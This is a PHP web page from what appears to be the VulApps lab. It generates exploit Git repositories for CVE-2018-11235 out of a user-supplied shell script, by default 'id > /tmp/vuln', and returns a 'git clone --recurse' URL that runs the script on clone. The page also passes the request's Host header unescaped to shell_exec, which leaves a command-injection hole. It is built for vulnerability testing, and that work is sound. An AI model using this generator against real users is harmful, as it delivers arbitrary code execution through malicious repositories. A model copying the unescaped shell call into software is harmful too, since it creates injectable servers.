<html>
 <head>
  <meta charset="utf-8">
  <title>VulApps CVE-2018-11235 Exp Generator</title>
 </head>
 <body>
    <p>VulApps CVE-2018-11235 Exp Generator</p>
    <form method="post">
        <label for="command">shell script:</label><br>
        <textarea id="command"  name="command" placeholder="#!/bin/sh
id > /tmp/vuln" style="width: 400px;height: 100px; margin-bottom: 10px;margin-top: 10px;">#!/bin/sh
id > /tmp/vuln</textarea><br/>
        <input type="submit" value="生成Exp" />
    </form>
    <a href="./repos/">查看已有仓库</a><br/>

<?php
    if (strpos($_SERVER['HTTP_HOST'], "127.0.0.1") !== false) {
        die("<br>请不要使用 127.0.0.1 这个地址来访问此页面");
    }

    if (isset($_REQUEST['command']) && !empty($_REQUEST['command'])) {
        $command = str_replace("\r\n", "\n", $_REQUEST['command']);
        file_put_contents("/tmp/evil.sh", $command);
        // @chdir("/var/www/html/repos/");
        $str="QWERTYUIOPASDFGHJKLZXCVBNM1234567890qwertyuiopasdfghjklzxcvbnm";
        str_shuffle($str);
        $repo_name=substr(str_shuffle($str),26,10);

        shell_exec("/bin/sh /var/www/html/build.sh ".$repo_name." ".$_SERVER['HTTP_HOST']);
        
        $expurl=$_SERVER['REQUEST_SCHEME']."://".$_SERVER['HTTP_HOST']."/git/".$repo_name;
        echo "生成Exp成功:<br/>";
        echo "Exp URL: ".$expurl."<br/>";
        echo "如果你想在自己机器上测试,执行: <br/>";
        echo "git clone --recurse ".$expurl;
    }
?>
 </body>
</html>
